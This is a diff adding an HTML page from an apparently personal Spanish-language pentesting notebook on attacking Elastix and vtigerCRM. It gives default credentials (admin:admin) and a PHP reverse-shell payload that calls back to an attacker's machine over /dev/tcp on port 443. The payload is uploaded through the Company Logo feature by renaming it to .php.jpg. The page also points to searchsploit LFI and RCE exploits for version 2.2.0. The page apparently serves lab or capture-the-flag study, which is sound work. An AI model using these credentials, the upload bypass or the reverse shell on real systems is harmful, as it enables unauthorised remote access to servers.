@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Elastix | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="elastix">
+          <div class="note-tabbar">
+            <span>Elastix</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/Comunicaciones</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / comunicaciones / elastix</p>
+            <h2>Elastix</h2>
+
+            <aside class="callout">
+              <p><strong>Panel login y credenciales predeterminadas:</strong> <code>/vtigercrm/</code> con <code>admin:admin</code>.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Enumerar versión</h3>
+              <pre><code>whatweb &lt;ip&gt;
+# Revisar código fuente</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Enumerar vulnerabilidades</h3>
+              <pre><code>searchsploit Elastix
+# Buscar exploits concretos por versión</code></pre>
+            </section>
+
+            <h2>Acceso al servidor desde interfaz web</h2>
+
+            <p>Ruta: <code>Settings</code> → <code>Settings</code> → <code>Company Details</code> → <code>Company Logo</code>.</p>
+
+            <section class="code-card">
+              <h3>payload.php</h3>
+              <pre><code>&lt;?php
+  system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;kali_ip&gt;/443 0&gt;&amp;1&#x27;&quot;)
+?&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Cambiar nombre del payload</h3>
+              <pre><code># Vtiger interpreta .jpg en el cambio de imagen de logo
+mv payload.php payload.php.jpg</code></pre>
+            </section>
+
+            <h2>Versión 2.2.0 LFI</h2>
+
+            <section class="code-card">
+              <h3>Exploit Searchsploit LFI</h3>
+              <pre><code>searchsploit -x 37637</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/elastix-lfi-searchsploit-1.png" alt="Exploit LFI de Elastix en Searchsploit" />
+            </figure>
+
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/elastix-lfi-searchsploit-2.png" alt="Detalle del exploit LFI de Elastix" />
+            </figure>
+
+            <h2>Versión 2.2.0 RCE</h2>
+
+            <section class="code-card">
+              <h3>Exploit Searchsploit RCE</h3>
+              <pre><code>searchsploit -x 18650
+# Puede necesitar modificaciones</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img src="https://alvruigut.github.io/assets/images/htb/beep/exploit.png" alt="Exploit adaptado para Elastix" />
+            </figure>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>elastix</span>
+              <span>vtigercrm</span>
+              <span>lfi</span>
+              <span>rce</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
